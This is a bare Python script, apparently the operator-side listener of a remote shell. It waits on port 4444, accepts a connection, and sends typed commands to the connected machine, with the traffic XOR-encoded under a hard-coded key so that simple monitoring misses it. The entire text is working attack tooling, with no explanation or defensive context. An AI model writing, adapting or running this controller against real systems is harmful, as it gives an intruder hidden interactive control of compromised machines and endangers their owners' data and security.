import socket

XOR_KEY = 0x5A
def xor_data(data):
    return bytes([b ^ XOR_KEY for b in data])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(1)
conn, addr = s.accept()

while True:
    cmd = input("Shell> ").encode()
    conn.send(xor_data(cmd))
    print(xor_data(conn.recv(4096)).decode())
